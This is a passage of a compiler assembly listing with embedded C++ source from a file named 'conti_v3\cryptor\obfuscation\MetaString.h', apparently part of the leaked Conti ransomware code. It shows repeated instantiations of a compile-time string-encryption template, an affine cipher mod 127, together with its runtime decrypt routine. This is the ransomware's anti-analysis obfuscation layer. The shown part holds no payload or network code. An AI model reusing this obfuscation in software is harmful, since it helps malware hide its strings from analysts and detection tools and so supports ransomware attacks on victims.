  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 71	 mov	 BYTE PTR [rcx+1], 113	; 00000071H
  00007	c6 41 02 4f	 mov	 BYTE PTR [rcx+2], 79	; 0000004fH
  0000b	c6 41 03 61	 mov	 BYTE PTR [rcx+3], 97	; 00000061H
  0000f	c6 41 04 4f	 mov	 BYTE PTR [rcx+4], 79	; 0000004fH
  00013	c6 41 05 65	 mov	 BYTE PTR [rcx+5], 101	; 00000065H
  00017	c6 41 06 4f	 mov	 BYTE PTR [rcx+6], 79	; 0000004fH
  0001b	c6 41 07 33	 mov	 BYTE PTR [rcx+7], 51	; 00000033H
  0001f	c6 41 08 4f	 mov	 BYTE PTR [rcx+8], 79	; 0000004fH
  00023	c6 41 09 4f	 mov	 BYTE PTR [rcx+9], 79	; 0000004fH
  00027	c6 41 0a 4f	 mov	 BYTE PTR [rcx+10], 79	; 0000004fH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 63   :         if (!isDecrypted())

  00003	84 c0		 test	 al, al
  00005	75 5a		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00007	4c 8d 51 01	 lea	 r10, QWORD PTR [rcx+1]
  0000b	41 bb 0a 00 00
	00		 mov	 r11d, 10
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00011	41 0f b6 02	 movzx	 eax, BYTE PTR [r10]
  00015	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00019	44 6b c0 d6	 imul	 r8d, eax, -42		; ffffffffffffffd6H

; 40   :     return (a % n + n) % n;

  0001d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00022	41 f7 e8	 imul	 r8d
  00025	41 03 d0	 add	 edx, r8d
  00028	c1 fa 06	 sar	 edx, 6
  0002b	8b c2		 mov	 eax, edx
  0002d	c1 e8 1f	 shr	 eax, 31
  00030	03 d0		 add	 edx, eax
  00032	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00035	44 2b c0	 sub	 r8d, eax
  00038	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0003d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00041	41 f7 e8	 imul	 r8d
  00044	41 03 d0	 add	 edx, r8d
  00047	c1 fa 06	 sar	 edx, 6
  0004a	8b c2		 mov	 eax, edx
  0004c	c1 e8 1f	 shr	 eax, 31
  0004f	03 d0		 add	 edx, eax
  00051	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00054	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00057	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0005b	49 83 eb 01	 sub	 r11, 1
  0005f	75 b0		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00061	48 8d 41 01	 lea	 rax, QWORD PTR [rcx+1]
  00065	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 0b	 mov	 BYTE PTR [rcx+1], 11
  00007	c6 41 02 00	 mov	 BYTE PTR [rcx+2], 0
  0000b	c6 41 03 64	 mov	 BYTE PTR [rcx+3], 100	; 00000064H
  0000f	c6 41 04 00	 mov	 BYTE PTR [rcx+4], 0
  00013	c6 41 05 49	 mov	 BYTE PTR [rcx+5], 73	; 00000049H
  00017	c6 41 06 00	 mov	 BYTE PTR [rcx+6], 0
  0001b	c6 41 07 6a	 mov	 BYTE PTR [rcx+7], 106	; 0000006aH
  0001f	c6 41 08 00	 mov	 BYTE PTR [rcx+8], 0
  00023	c6 41 09 00	 mov	 BYTE PTR [rcx+9], 0
  00027	c6 41 0a 00	 mov	 BYTE PTR [rcx+10], 0
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 4b	 sub	 ecx, 75			; 0000004bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 38	 mov	 BYTE PTR [rcx+1], 56	; 00000038H
  00007	c6 41 02 4b	 mov	 BYTE PTR [rcx+2], 75	; 0000004bH
  0000b	c6 41 03 0d	 mov	 BYTE PTR [rcx+3], 13
  0000f	c6 41 04 4b	 mov	 BYTE PTR [rcx+4], 75	; 0000004bH
  00013	c6 41 05 57	 mov	 BYTE PTR [rcx+5], 87	; 00000057H
  00017	c6 41 06 4b	 mov	 BYTE PTR [rcx+6], 75	; 0000004bH
  0001b	c6 41 07 32	 mov	 BYTE PTR [rcx+7], 50	; 00000032H
  0001f	c6 41 08 4b	 mov	 BYTE PTR [rcx+8], 75	; 0000004bH
  00023	c6 41 09 73	 mov	 BYTE PTR [rcx+9], 115	; 00000073H
  00027	c6 41 0a 4b	 mov	 BYTE PTR [rcx+10], 75	; 0000004bH
  0002b	c6 41 0b 63	 mov	 BYTE PTR [rcx+11], 99	; 00000063H
  0002f	c6 41 0c 4b	 mov	 BYTE PTR [rcx+12], 75	; 0000004bH
  00033	c6 41 0d 4b	 mov	 BYTE PTR [rcx+13], 75	; 0000004bH
  00037	c6 41 0e 4b	 mov	 BYTE PTR [rcx+14], 75	; 0000004bH
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 0a	 sub	 ecx, 10

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 23	 mov	 BYTE PTR [rcx+1], 35	; 00000023H
  00007	c6 41 02 0a	 mov	 BYTE PTR [rcx+2], 10
  0000b	c6 41 03 29	 mov	 BYTE PTR [rcx+3], 41	; 00000029H
  0000f	c6 41 04 0a	 mov	 BYTE PTR [rcx+4], 10
  00013	c6 41 05 48	 mov	 BYTE PTR [rcx+5], 72	; 00000048H
  00017	c6 41 06 0a	 mov	 BYTE PTR [rcx+6], 10
  0001b	c6 41 07 09	 mov	 BYTE PTR [rcx+7], 9
  0001f	c6 41 08 0a	 mov	 BYTE PTR [rcx+8], 10
  00023	c6 41 09 67	 mov	 BYTE PTR [rcx+9], 103	; 00000067H
  00027	c6 41 0a 0a	 mov	 BYTE PTR [rcx+10], 10
  0002b	c6 41 0b 0a	 mov	 BYTE PTR [rcx+11], 10
  0002f	c6 41 0c 0a	 mov	 BYTE PTR [rcx+12], 10
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 0f	 sub	 ecx, 15

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3e	 mov	 BYTE PTR [rcx+1], 62	; 0000003eH
  00007	c6 41 02 0f	 mov	 BYTE PTR [rcx+2], 15
  0000b	c6 41 03 77	 mov	 BYTE PTR [rcx+3], 119	; 00000077H
  0000f	c6 41 04 0f	 mov	 BYTE PTR [rcx+4], 15
  00013	c6 41 05 60	 mov	 BYTE PTR [rcx+5], 96	; 00000060H
